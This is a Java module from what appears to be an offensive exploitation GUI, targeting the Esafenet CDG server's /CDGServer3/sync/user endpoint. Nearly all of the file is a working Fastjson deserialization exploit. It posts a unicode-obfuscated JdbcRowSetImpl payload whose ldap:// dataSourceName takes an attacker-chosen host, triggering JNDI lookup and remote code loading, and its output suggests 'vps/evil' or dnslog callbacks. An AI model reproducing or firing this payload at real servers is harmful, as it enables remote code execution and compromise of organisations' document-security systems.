package exp.oa.esafenet;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class esafenet_syncuser_fastjson_jndi implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
    return att(url, textArea);
}

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try{
            String data = "{\n" +
                    "\"byef2tz1pc\": {\n" +
                    "\"\\x40\\u0074\\u0079\\u0070\\u0065\":\n" +
                    "\"java.\\u006C\\u0061\\u006E\\u0067.\\u0043\\u006C\\u0061\\u0073\\u0073\",\n" +
                    "\"val\":\n" +
                    "\"\\u0063\\u006F\\u006D\\u002E\\u0073\\u0075\\u006E\\u002E\\u0072\\u006F\\u0077\\u0073\\u0065\\u007\n" +
                    "4\\u002E\\u004A\\u0064\\u0062\\u0063\\u0052\\u006F\\u0077\\u0053\\u0065\\u0074\\u0049\\u006D\\u007\n" +
                    "0\\u006C\"\n" +
                    "},\n" +
                    "\"e0tqw9p3r83fjcilkbjl\": {\n" +
                    "\"\\x40\\u0074\\u0079\\u0070\\u0065\":\n" +
                    "\"\\u0063\\u006F\\u006D\\u002E\\u0073\\u0075\\u006E\\u002E\\u0072\\u006F\\u0077\\u0073\\u0065\\u007\n" +
                    "4\\u002E\\u004A\\u0064\\u0062\\u0063\\u0052\\u006F\\u0077\\u0053\\u0065\\u0074\\u0049\\u006D\\u007\n" +
                    "0\\u006C\",\n" +
                    "\"d_a_t_a_S_o_u_r_c_e_Na_m_e\":\n" +
                    "\"\\u006C\\u0064\\u0061\\u0070\\u003A\\u002F\\u002F\",\n" +
                    "\"au_to_Co_mm_i_t\": true\n" +
                    "}\n" +
                    "}";
            HashMap head = new HashMap<String, String>();
            head.put("Content-Type","application/json");
            Response response = HttpTools.post(url + "/CDGServer3/sync/user",data, head, "utf-8");
            if (response.getCode() != 404 ) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ esafenet_syncuser_fastjson_jndi ]");
                    textArea.appendText("\n 存在/CDGServer3/sync/user");
                });
                Platform.runLater(() -> {
                    textArea.appendText("\n eg1: dnslog.cn");
                    textArea.appendText("\n eg2: vps/evil\n");
                });
                return true;
            } else {
                Platform.runLater(() -> textArea.appendText("\n"));

                return false;
            }
        }catch (Exception e){
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        try{
            String data = "{\n" +
                    "\"byef2tz1pc\": {\n" +
                    "\"\\x40\\u0074\\u0079\\u0070\\u0065\":\n" +
                    "\"java.\\u006C\\u0061\\u006E\\u0067.\\u0043\\u006C\\u0061\\u0073\\u0073\",\n" +
                    "\"val\":\n" +
                    "\"\\u0063\\u006F\\u006D\\u002E\\u0073\\u0075\\u006E\\u002E\\u0072\\u006F\\u0077\\u0073\\u0065\\u007\n" +
                    "4\\u002E\\u004A\\u0064\\u0062\\u0063\\u0052\\u006F\\u0077\\u0053\\u0065\\u0074\\u0049\\u006D\\u007\n" +
                    "0\\u006C\"\n" +
                    "},\n" +
                    "\"e0tqw9p3r83fjcilkbjl\": {\n" +
                    "\"\\x40\\u0074\\u0079\\u0070\\u0065\":\n" +
                    "\"\\u0063\\u006F\\u006D\\u002E\\u0073\\u0075\\u006E\\u002E\\u0072\\u006F\\u0077\\u0073\\u0065\\u007\n" +
                    "4\\u002E\\u004A\\u0064\\u0062\\u0063\\u0052\\u006F\\u0077\\u0053\\u0065\\u0074\\u0049\\u006D\\u007\n" +
                    "0\\u006C\",\n" +
                    "\"d_a_t_a_S_o_u_r_c_e_Na_m_e\":\n" +
                    "\"\\u006C\\u0064\\u0061\\u0070\\u003A\\u002F\\u002F"+cmd+"\",\n" +
                    "\"au_to_Co_mm_i_t\": true\n" +
                    "}\n" +
                    "}";
            HashMap head = new HashMap<String, String>();
            head.put("Content-Type","application/json");
            Response response = HttpTools.post(url + "/CDGServer3/sync/user",data, head, "utf-8");
            if (response.getCode() != 404 ) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行成功,请自行判断");
                    textArea_cmd.appendText("\n"+ cmd);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行失败！");
                });
                return false;
            }
        }catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });

        }
        return false;
    }
}
